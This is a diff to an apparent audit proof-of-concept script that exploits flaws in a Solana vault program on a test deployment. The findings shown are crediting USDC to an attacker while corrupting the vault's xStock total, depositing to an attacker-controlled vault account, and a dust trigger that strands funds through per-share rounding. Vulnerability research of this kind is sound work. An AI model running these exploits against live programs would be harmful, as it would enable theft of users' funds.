@@ -108,9 +108,9 @@ const SYS = SystemProgram.programId;
     console.log(`  USDC credited to attacker:    ${Number((BigInt(atkUA.toString()) - BigInt(atkUB.toString())).toString()) / 1e6} USDC`);
     console.log(`  vault.total_xstock: ${v0.totalXstock.toString()} -> ${v1.totalXstock.toString()} (corrupted; real xStock untouched)`);
   } catch (e) {
-    const logs = (e.transactionLogs || []);
-    console.log("blocked. logs:");
-    logs.slice(-14).forEach(l => console.log("   ", l));
+    const msg = String(e.message || e).match(/Error Message: [^"]*/)?.[0] || String(e).slice(0, 200);
+    console.log("blocked:", msg);
+    (e.transactionLogs || []).slice(-6).forEach(l => console.log("   ", l));
   }
   console.log("\n=== F-1b: deposit -> attacker-controlled vault_xstock ===");
   const h = Keypair.generate(); await fund(h);
@@ -131,15 +131,25 @@ const SYS = SystemProgram.programId;
   }
 
   // ================= F-2: dust trigger stuck =================
-  console.log("\n=== F-2: dust trigger (1 base USDC) ===");
+  // per_share = floor(amount*1e12 / total_shares) = 0  <=>  total_shares > amount*1e12.
+  // With amount = 1 base unit (min for a 6-dec USDC mint), needs total_shares > 1e12.
+  console.log("\n=== F-2: dust trigger (per_share=0) ===");
+  const big = Keypair.generate(); await fund(big);
+  const bigX = await createAssociatedTokenAccount(conn, owner, xMint, big.publicKey);
+  const bigU = await createAssociatedTokenAccount(conn, owner, uMint, big.publicKey);
+  const pBig = progOf(big);
+  await mintTo(conn, owner, xMint, bigX, P, D(10000, 8)); // push total_shares past 1e12
+  await dep(pBig, big, bigX, D(10000, 8));
+  const vF2 = await program.account.vault.fetch(vVault);
+  console.log(`total_shares now ${vF2.totalShares.toString()} (>1e12 => 1 base USDC => per_share=0)`);
+  await claim(pVic, vic, vicU); // victim sweeps accrued FIRST so next claim isolates the dust
   await mintTo(conn, owner, uMint, atOwnerU, P, D(10, 6)); // re-fund admin USDC
-  const pB2 = await bal(vVaultU);
-  await trigger(new BN(1));
-  const pA2 = await bal(vVaultU);
-  const vicUB = await bal(vicU);
-  const cr = await claim(pVic, vic, vicU).then(() => "claimed").catch(e => String(e.message || e).match(/Error Message: [^"]*/)?.[0] || "err");
-  const vicUA = await bal(vicU);
-  console.log(`pool ${Number(pB2)} -> ${Number(pA2)} (+${Number(pA2 - pB2)} base); victim claim=${cr} (+${Number(vicUA - vicUB)} base); remainder stuck in pool, no rescue ix`);
+  const pB3 = await bal(vVaultU);
+  const trigRes = await trigger(new BN(1)).then(() => "TRIGGERED (vuln: 1 base USDC enters pool, per_share=0)").catch(e => "blocked: " + (String(e.message || e).match(/Error Message: [^"]*/)?.[0] || String(e).slice(0, 120)));
+  const vicUB3 = await bal(vicU);
+  const cr3 = await claim(pVic, vic, vicU).then(() => "claimed").catch(e => String(e.message || e).match(/Error Message: [^"]*/)?.[0] || "err");
+  const vicUA3 = await bal(vicU);
+  console.log(`dust trigger: ${trigRes}; pool ${Number(pB3)} -> ${Number(await bal(vVaultU))}; claim=${cr3} (+${Number(vicUA3 - vicUB3)} base; 0 => dust stranded forever, no rescue ix)`);
 
   // ================= H-A: rounding drift =================
   console.log("\n=== H-A: rounding drift (10 xStock round-trip) ===");
